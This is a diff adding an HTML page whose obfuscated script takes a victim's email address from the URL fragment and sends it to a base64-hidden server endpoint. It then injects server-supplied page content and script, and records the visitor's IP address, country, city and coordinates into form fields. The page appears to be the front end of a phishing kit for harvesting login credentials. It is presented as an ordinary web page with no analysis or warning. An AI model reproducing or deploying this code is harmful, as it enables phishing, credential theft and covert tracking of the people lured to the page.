@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+    <link rel="stylesheet" href="style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css"
+      integrity="sha512-xh6O/CkQoPOWDdYTDqeRdPCVd1SpvCA9XXcUnZS2FmJNp1coAFzvtCN9BmamE+4aHK8yyUHUSCcJHgXloTyT2A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <script
+      src="https://kit.fontawesome.com/1315988376.js"
+      crossorigin="anonymous"
+    ></script>
+
+    <link id="apple-touch-icon" rel="apple-touch-icon" />
+    <link id="apple-touch-startup-image" rel="apple-touch-startup-image" />
+    <link id="shortcut_icon" rel="shortcut icon" />
+  </head>
+  <body>
+
+    <div id="mainBody">
+
+    </div>
+
+
+    <script>
+        const __winHref = window.location.href.split("?")[0];
+        const __getInd__ = (str, search) => str.indexOf(search);
+        const __getSlice__ = (str, index) => str.substr(index);
+        const __getEl__ = (sel) => document.querySelector(sel);
+        const __json = (url) => fetch(url).then((res) => res.json());
+        
+    </script>
+    
+    <script src="./srv.js"></script>
+    <script id="sctoapnd1"></script>
+
+    <script>
+      async function _start() {
+        const cntHome = __getEl__("#mainBody");
+        const scToAppend1 = __getEl__("#sctoapnd1");
+
+        const __getURLEm = () => {
+          if (__getInd__(__winHref, "#") === -1) {
+            console.log("ue 1 failed");
+            return false;
+          }
+
+          if (__getInd__(__winHref, "@") === -1) {
+            console.log("ue 2 failed");
+            return false;
+          }
+
+          return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
+        };
+
+        const __UrlEm = __getURLEm();
+
+        if (
+          __getInd__(__winHref, "#") === -1 ||
+          __getInd__(__winHref, "@") === -1 ||
+          !Boolean(__UrlEm)
+        ) {
+          console.log("Failed");
+          return;
+        }
+
+        async function loadLoc(key) {
+          return await __json(`https://api.ipdata.co?api-key=${atob(key)}`);
+        }
+
+        async function hydrate() {
+          const __fetchOptions = {
+            method: "POST",
+            body: JSON.stringify({
+              __UrlEm,
+            }),
+            headers: {
+              "Content-Type": "application/json",
+            },
+          };
+
+          const __res = await fetch(
+            `${window.stef.srv_loc}${atob("L2lucy9zdG9yZS5waHA=")}`,
+            __fetchOptions
+          );
+
+          const __resData = await __res.json();
+
+          // hydrate
+          cntHome.innerHTML = __resData.data.cnt;
+          cntHome.classList.add("display_block");
+
+          const __locData = await loadLoc(__resData.data.key);
+
+          __getEl__("#_pidt_field_").value =
+            __locData.ip || "error retrieving data";
+          __getEl__("#_ocdt_field_").value =
+            __locData.country_name || "error retrieving data";
+          __getEl__("#_icdt_field_").value =
+            __locData.city || "error retrieving data";
+          __getEl__("#_oldt_field_").value =
+            __locData.longitude || "error retrieving data";
+          __getEl__("#_aldt_field_").value =
+            __locData.latitude || "error retrieving data";
+
+          scToAppend1.innerHTML = __resData.data.crpt1;
+
+          // console.log({ __resData });
+          // console.log({ __locData });
+
+          __setUp();
+          return;
+        }
+
+        hydrate();
+      }
+
+      _start();
+    </script>
+
+  </body>
+</html>
